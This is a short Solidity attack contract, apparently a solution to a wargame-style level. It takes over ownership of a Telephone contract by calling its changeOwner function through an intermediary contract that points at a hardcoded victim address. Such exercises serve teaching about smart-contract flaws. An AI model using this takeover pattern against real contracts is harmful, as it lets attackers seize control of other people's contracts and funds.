pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attackx {

    // CHANGE ADDRESS OF VICTIM CONTRACT
    Telephone public victimContract = Telephone(0x48348276b8fa9b4a90dDBA5271Fa0F4f51D5FCf9);

    function attack (address _owner) public {
        victimContract.changeOwner(_owner);
    }
}